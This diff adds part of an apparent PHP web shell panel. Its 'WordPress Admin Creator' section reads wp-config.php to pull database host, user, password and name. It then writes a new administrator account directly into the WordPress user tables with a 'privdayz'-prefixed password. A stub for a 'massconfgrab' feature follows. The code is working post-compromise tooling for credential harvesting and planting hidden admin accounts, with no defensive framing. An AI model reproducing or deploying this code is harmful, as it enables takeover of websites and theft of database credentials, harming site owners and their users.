@@ -1,0 +1,137 @@
+<?php elseif (isset($_GET['createadmin'])): ?>
+<div class="pzcard-main">
+  <div class="pzcard-header">
+    <div class="pzcard-icon" style="background:#e53935;"><i class="fas fa-user-plus"></i></div>
+    <div class="pzcard-title">
+      WordPress Admin Creator
+    </div>
+  </div>
+  <div class="pzcard-content">
+    <form method="post" style="margin-bottom:18px; display:flex; gap:8px;">
+      <input type="text" name="wp_config_path" class="pzcard-inp" placeholder="path to wp-config.php" value="<?= htmlspecialchars($_POST['wp_config_path'] ?? getcwd().'/wp-config.php') ?>">
+      <button type="submit" name="get_config" class="pzcard-btn pzcard-btn-blue"><i class="fas fa-search"></i> get config</button>
+    </form>
+    
+    <?php
+    $db_conf = ['host'=>'', 'user'=>'', 'pass'=>'', 'db'=>''];
+    
+    if (isset($_POST['get_config']) && !empty($_POST['wp_config_path']) && file_exists($_POST['wp_config_path'])) {
+        $cfg = file_get_contents($_POST['wp_config_path']);
+        
+        preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\);/", $cfg, $mh); 
+        if(isset($mh[1])) $db_conf['host'] = $mh[1];
+        
+        preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\);/", $cfg, $mu); 
+        if(isset($mu[1])) $db_conf['user'] = $mu[1];
+        
+        preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\);/", $cfg, $mp); 
+        if(isset($mp[1])) $db_conf['pass'] = $mp[1];
+        
+        preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\);/", $cfg, $md); 
+        if(isset($md[1])) $db_conf['db'] = $md[1];
+
+        echo '<div class="pzcard-info" style="background:#eafff5;color:#16a34a;padding:8px 13px;border-radius:7px;">DB config loaded! Fill the form below.</div>';
+    } elseif (isset($_POST['get_config'])) {
+        echo '<div class="pzcard-info" style="background:#fff4f4;color:#e53935;padding:8px 13px;border-radius:7px;">Config not found or path error!</div>';
+    }
+    ?>
+    
+    <form method="post" class="pzcard-form" autocomplete="off" style="margin:14px 0;">
+      <input type="hidden" name="from_config" value="1">
+      <div style="display:flex;flex-wrap:wrap;gap:11px;">
+        <input type="text" name="db_host" class="pzcard-inp" placeholder="DB Host" value="<?= htmlspecialchars($db_conf['host'] ?? ($_POST['db_host'] ?? 'localhost')) ?>" required>
+        <input type="text" name="db_user" class="pzcard-inp" placeholder="DB User" value="<?= htmlspecialchars($db_conf['user'] ?? ($_POST['db_user'] ?? '')) ?>" required>
+        <input type="password" name="db_pass" class="pzcard-inp" placeholder="DB Pass" value="<?= htmlspecialchars($db_conf['pass'] ?? ($_POST['db_pass'] ?? '')) ?>">
+        <input type="text" name="db_name" class="pzcard-inp" placeholder="DB Name" value="<?= htmlspecialchars($db_conf['db'] ?? ($_POST['db_name'] ?? '')) ?>" required>
+      </div>
+      <div style="display:flex;flex-wrap:wrap;gap:11px;margin-top:11px;">
+        <input type="text" name="admin_user" class="pzcard-inp" placeholder="Admin Username" required>
+        <input type="email" name="admin_email" class="pzcard-inp" placeholder="Admin Email" required>
+        <input type="text" name="admin_pass" class="pzcard-inp" readonly value="<?= htmlspecialchars('privdayz'.rand(10000,99999)) ?>" style="background:#eafff5;color:#16a34a;">
+      </div>
+      <div style="margin-top:13px;">
+        <button type="submit" name="create_wp_admin" class="pzcard-btn pzcard-btn-red">
+          <i class="fas fa-plus"></i> create wpAdmin
+        </button>
+      </div>
+    </form>
+    
+    <div id="pzcard-admin-result" style="margin:13px 2px 0 2px;">
+      <?php
+      if (isset($_POST['create_wp_admin'])) { 
+          $host = trim($_POST['db_host'] ?? ''); 
+          $user = trim($_POST['db_user'] ?? ''); 
+          $pass = trim($_POST['db_pass'] ?? ''); 
+          $db = trim($_POST['db_name'] ?? ''); 
+          $admin_user = trim($_POST['admin_user'] ?? ''); 
+          $admin_email = trim($_POST['admin_email'] ?? ''); 
+          $admin_pass = trim($_POST['admin_pass'] ?? ''); 
+          
+          if (empty($host) || empty($user) || empty($db) || empty($admin_user) || empty($admin_email) || empty($admin_pass)) { 
+              echo '<div style="color:#e53935;">All fields required!</div>'; 
+          } else { 
+              $mysqli = @new mysqli($host, $user, $pass, $db); 
+              
+              if ($mysqli->connect_errno) { 
+                  echo '<div style="color:#e53935;">DB Connect Error: '.htmlspecialchars($mysqli->connect_error).'</div>'; 
+              } else { 
+                  function wp_hash_password($password) { 
+                      if (function_exists('password_hash')) {
+                          return password_hash($password, PASSWORD_BCRYPT); 
+                      }
+                      $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
+                      $random = ''; 
+                      for ($i = 0; $i < 16; $i++) {
+                          $random .= $itoa64[rand(0, 63)]; 
+                      }
+                      $salt = '$P$B' . substr($random, 0, 8); 
+                      return crypt($password, $salt); 
+                  } 
+                  
+                  $hash = wp_hash_password($admin_pass); 
+                  $now = date('Y-m-d H:i:s'); 
+                  $mysqli->set_charset("utf8mb4"); 
+                  
+                  $chk = $mysqli->prepare("SELECT ID FROM wp_users WHERE user_login=? OR user_email=? LIMIT 1"); 
+                  $chk->bind_param("ss", $admin_user, $admin_email); 
+                  $chk->execute(); 
+                  $chk->store_result(); 
+                  
+                  if ($chk->num_rows > 0) { 
+                      echo '<div style="color:#e53935;">This user/email already exists!</div>'; 
+                  } else { 
+                      $stmt = $mysqli->prepare("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, ?, 0, ?)"); 
+                      $stmt->bind_param("ssssss", $admin_user, $hash, $admin_user, $admin_email, $now, $admin_user); 
+                      
+                      if ($stmt->execute()) { 
+                          $uid = $mysqli->insert_id; 
+                          $meta1 = 'a:1:{s:13:"administrator";s:1:"1";}'; 
+                          $meta2 = '10'; 
+                          
+                          $stmt1 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', ?)"); 
+                          $stmt1->bind_param("is", $uid, $meta1); 
+                          $stmt1->execute(); 
+                          
+                          $stmt2 = $mysqli->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_user_level', ?)"); 
+                          $stmt2->bind_param("is", $uid, $meta2); 
+                          $stmt2->execute(); 
+                          
+                          echo '<div style="color:#10b981;"><b>Admin user created!</b><br>Login: <b>'.htmlspecialchars($admin_user).'</b><br>Pass: <b>'.htmlspecialchars($admin_pass).'</b></div>'; 
+                      } else { 
+                          echo '<div style="color:#e53935;">Failed to insert user: '.htmlspecialchars($stmt->error).'</div>'; 
+                      } 
+                  } 
+                  $mysqli->close();
+              } 
+          } 
+      }
+      ?>
+    </div>
+  </div>
+</div>
+
+<?php elseif (isset($_GET['massconfgrab'])): ?>
+<?php
+// Your massconfgrab code here
+?>
+<?php endif; ?>
